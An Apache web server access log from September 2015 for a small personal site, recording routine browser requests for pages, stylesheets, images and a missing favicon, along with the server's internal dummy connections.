14.139.240.50 - - [22/Sep/2015:21:22:19 +0530] "GET /img/mainbg.png HTTP/1.1" 200 1280738 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:21:23:00 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
14.139.240.50 - - [22/Sep/2015:21:23:00 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
14.139.240.50 - - [22/Sep/2015:21:23:11 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
14.139.240.50 - - [22/Sep/2015:21:23:11 +0530] "GET /img/mainbg.png HTTP/1.1" 304 182 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
14.139.240.50 - - [22/Sep/2015:21:23:19 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
14.139.240.50 - - [22/Sep/2015:21:23:22 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:21:23:59 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:21:24:17 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:21:24:18 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:21:24:18 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:21:24:36 +0530] "GET /img/mainbg.png HTTP/1.1" 304 183 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:21:24:40 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:21:24:40 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
69.164.195.119 - - [22/Sep/2015:21:31:40 +0530] "GET /hSfshmz HTTP/1.1" 404 463 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;)"
::1 - - [22/Sep/2015:21:33:10 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:21:34:53 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
14.139.240.50 - - [22/Sep/2015:21:39:09 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12"
14.139.240.50 - - [22/Sep/2015:21:39:09 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12"
14.139.240.50 - - [22/Sep/2015:21:39:09 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12"
14.139.240.50 - - [22/Sep/2015:21:39:10 +0530] "GET /img/mainbg.png HTTP/1.1" 200 1280739 "http://arpansharma.xyz/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12"
106.192.0.244 - - [22/Sep/2015:21:45:20 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
106.192.0.244 - - [22/Sep/2015:21:45:22 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
106.192.0.244 - - [22/Sep/2015:21:45:50 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
106.192.0.244 - - [22/Sep/2015:21:45:50 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
::1 - - [22/Sep/2015:21:50:17 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:21:58:47 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:22:19:21 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:22:20:45 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:22:24:02 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
